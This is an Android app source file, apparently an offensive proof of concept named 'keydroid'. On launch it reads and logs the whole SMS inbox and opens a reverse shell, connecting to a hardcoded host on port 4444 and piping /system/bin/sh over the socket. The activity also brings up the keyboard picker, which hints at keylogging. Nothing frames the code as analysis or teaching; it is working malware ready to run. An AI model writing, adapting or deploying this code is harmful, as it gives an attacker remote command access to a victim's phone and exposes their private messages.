package com.example.keydroid;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.inputmethod.InputMethodManager;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

import static android.os.Build.HOST;

public class MainActivity extends Activity {
    private final static String SH_PATH = "/system/bin/sh";
    private static Socket sock = null;
    private final static String HOST = "192.168.0.107";
    private final static int PORT = 4444;
    static String TAG = "ReverseShell";
    final int REQUEST_CODE_ASK_PERMISSIONS = 123;
    private static final int PERMISSIONS_REQUEST_RECEIVE_SMS = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        InputMethodManager imeManager = (InputMethodManager) getApplicationContext().getSystemService(INPUT_METHOD_SERVICE);
        imeManager.showInputMethodPicker();
        ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
        requestPermissions(Manifest.permission.RECEIVE_SMS, PERMISSIONS_REQUEST_RECEIVE_SMS);


        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String msgData = "";
                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);

                }
                Log.d("SMS", msgData);
                // use msgData
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    revershell();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();

    }

    private void requestPermissions(String permission, int requestCode) {
        // Here, thisActivity is the current activity
        if (ContextCompat.checkSelfPermission(this, permission)
                != PackageManager.PERMISSION_GRANTED) {

            // Should we show an explanation?
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {

            } else {


                ActivityCompat.requestPermissions(this,
                        new String[]{permission},
                        requestCode);

            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSIONS_REQUEST_RECEIVE_SMS: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    Log.d("MainActivity", "Success");

                } else {

                    Log.d("MainActivity", "Failed");

                }
                return;
            }

        }
    }


    public void revershell() throws Exception {
        // `sh` should be on this path but verify on your target device
        Log.d(TAG, "Attepting to connect to " + HOST + ":" + PORT);
        try {
            sock = new Socket();
            sock.connect(new InetSocketAddress(HOST, PORT));
        } catch (IOException e) {
            Log.e(TAG, "Failed to create socket: " + e);
            return;
        }
        Log.d(TAG, "Connected to " + HOST + ":" + PORT);

        executeShell();

        if (sock != null && sock.isClosed()) {
            try {
                sock.close();
            } catch (IOException e) {
                // don't care
            }
        }
    }

    public static void executeShell() {
        Process shell;
        try {
            shell = new ProcessBuilder(SH_PATH).redirectErrorStream(true).start();
        } catch (IOException e) {
            Log.e(TAG, "Failed to start \"" + SH_PATH + "\": " + e);
            return;
        }

        InputStream pis, pes, sis;
        OutputStream pos, sos;

        try {
            pis = shell.getInputStream();
            pes = shell.getErrorStream();
            sis = sock.getInputStream();
            pos = shell.getOutputStream();
            sos = sock.getOutputStream();
        } catch (IOException e) {
            Log.e(TAG, "Failed to obtain streams: " + e);
            shell.destroy();
            return;
        }

        while (!sock.isClosed()) {
            try {
                while (pis.available() > 0) {
                    sos.write(pis.read());
                }

                while (pes.available() > 0) {
                    sos.write(pes.read());
                }

                while (sis.available() > 0) {
                    pos.write(sis.read());
                }

                sos.flush();
                pos.flush();
            } catch (IOException e) {
                Log.e(TAG, "Stream error: " + e);
                shell.destroy();
            }

            try {
                Thread.sleep(50);
            } catch (InterruptedException e) {
                // don't care
            }

            try {
                shell.exitValue();
                break;
            } catch (IllegalThreadStateException e) {
                // shell process is still running, can't get exit value
            }
        }

        Log.d(TAG, "Socket is not connected, exiting.");
        shell.destroy();
    }
}